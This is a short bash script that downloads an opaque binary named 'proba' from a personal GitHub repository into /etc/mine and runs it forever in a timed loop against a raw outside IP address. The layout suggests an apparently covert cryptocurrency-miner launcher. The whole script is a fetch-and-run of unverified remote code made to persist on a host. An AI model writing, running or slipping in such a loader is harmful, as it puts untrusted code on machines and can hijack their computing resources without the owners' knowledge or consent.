#!/bin/bash
cd /etc/mine
rm proba
wget https://github.com/aleksey1255/ai/raw/main/proba
chmod u+x proba
while true; do
timeout 1800 /etc/mine/proba -a 80.240.18.106
done
